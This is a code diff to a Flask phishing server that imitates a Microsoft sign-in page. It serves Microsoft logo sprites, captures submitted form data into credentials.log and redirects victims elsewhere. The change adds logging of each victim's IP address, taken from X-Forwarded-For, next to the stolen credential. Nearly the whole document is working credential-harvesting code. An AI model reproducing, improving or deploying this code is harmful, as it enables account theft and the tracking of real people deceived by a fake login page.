@@ -9,6 +9,17 @@ redirect_url = argv[1]
 host = argv[2]
 port = int(argv[3])
 
+def address(): #use our own function just in case the flask server is being hosted behind a proxy
+    """
+    This shouldn't be used for ratelimiting or actual tracking via ip addresses
+    these request headers can easily be spoofed and I am adding it mainly as a simple way to get addresses behind a proxy
+    tested with Nginx on ubuntu (not familiar with ngrox so someone else can adjust this function for that)
+    """
+    if request.headers.getlist('X-Forwarded-For'):
+        return request.headers.getlist('X-Forwarded-For')[0]
+    else:
+        return request.remote_addr
+
 
 @app.route("/")
 def email():
@@ -25,14 +36,14 @@ def passwd():
 def grabcreds():
     data = request.form.to_dict(flat=False)
     with open("credentials.log", "a") as file:
-        file.write(f"{list(data.keys())[0]} : {data[list(data.keys())[0]][0]}\n")
+        file.write(f"{list(data.keys())[0]} : {data[list(data.keys())[0]][0]} : {address()} \n")
     return redirect(redirect_url)
 
 
 
 @app.route("/sprites/microsoft_logo.svg")
 def Logo1():
-    return send_file(os.path.join("templates", "sprites", "microsoft_logo.svg"))   
+    return send_file(os.path.join("templates", "sprites", "microsoft_logo.svg"))
 
 
 @app.route("/sprites/icon_key.svg")
@@ -60,9 +71,9 @@ def Logo3():
     return send_file(os.path.join("templates", "sprites", "ellipsis_white.svg"))
 
 
-@app.route("/sprites/ellipsis_grey.svg")    
+@app.route("/sprites/ellipsis_grey.svg")
 def Logo4():
     return send_file(os.path.join("templates", "sprites", "ellipsis_grey.svg"))
 
 
-app.run(host=host, port=port)  
+app.run(host=host, port=port)
